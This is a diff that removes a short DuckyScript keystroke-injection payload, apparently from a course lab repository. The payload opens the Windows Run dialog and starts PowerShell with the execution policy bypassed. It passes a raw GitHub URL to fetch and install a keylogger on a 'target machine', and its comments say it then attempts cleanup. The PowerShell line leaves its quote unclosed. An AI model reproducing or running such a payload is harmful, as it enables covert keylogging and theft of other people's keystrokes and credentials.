@@ -1,9 +1,0 @@
-REM This script downloads and runs a keylogger, then attempts cleanup.
-REM Ensure Python is installed on the target machine.
-REM IMPORTANT: Replace placeholder URLs with actual raw GitHub file URLs.
-
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoExit -ExecutionPolicy Bypass -File C:\Temp\deploy.ps1 -PythonScriptUrl "https://raw.githubusercontent.com/butlersl/305-lab-files/main/Keylogger/install_keylogger.ps1
-ENTER
